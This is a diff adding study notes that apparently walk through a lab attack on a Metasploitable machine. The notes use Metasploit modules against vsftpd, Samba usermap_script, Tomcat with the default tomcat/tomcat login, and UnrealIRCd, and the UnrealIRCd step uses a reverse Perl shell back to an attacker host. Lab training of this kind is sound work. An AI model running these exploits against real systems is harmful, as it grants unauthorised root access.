@@ -1,0 +1,44 @@
+First do a netdiscover
+	sudo netdiscover -i eth____
+Today we will be working on FTP (again), which is running VSFTPD on port 21, SAMBA port 139, apache TOMCAT port 8180, 
+	and UNREAL IRCD port 6667 and 6697
+Start with FTP VSFTPD (Very Secure FTP Dameon)
+	Lets first search for an attack with that version number with metasploit
+		msfconsole
+		search vsftpd
+	We find one expolit, lets use it
+		use 0
+		show options
+		set rhost 10.10.10.4
+		run
+			id (we see that we are root, that was easy)
+			we can now transfer files if we want into metasploitable :)
+Next we are working on SAMBA, port 139
+	lets use usermap_script to allow for command execution
+	use 13
+	show options
+	set rhosts 10.10.10.4
+	set lhosts 10.10.10.5
+	exploit
+		we are now in command execution, do a whoami and we can see that we are root
+Search tomcat
+	lets use mgr_deploy, use 16
+	tomcat's username and password by default within the program is tomcat
+		If need be we could bruteforce it at this time, however lets see if they used default creds.
+	show options
+		set httpusername tomcat
+		set httppassword tomcat
+		set rhosts 10.10.10.4
+		set rport 8180
+		set lhost 10.10.10.5
+		show targets
+			pick the java one, set targets 1
+		exploit
+Lastly, UNREAL IRCd
+	search unrealircd
+	use 0
+	set payload cmd/unix/reverse_perl
+	show options
+	set rhost 10.10.10.4
+	set lhost 10.10.10.5
+	exploit
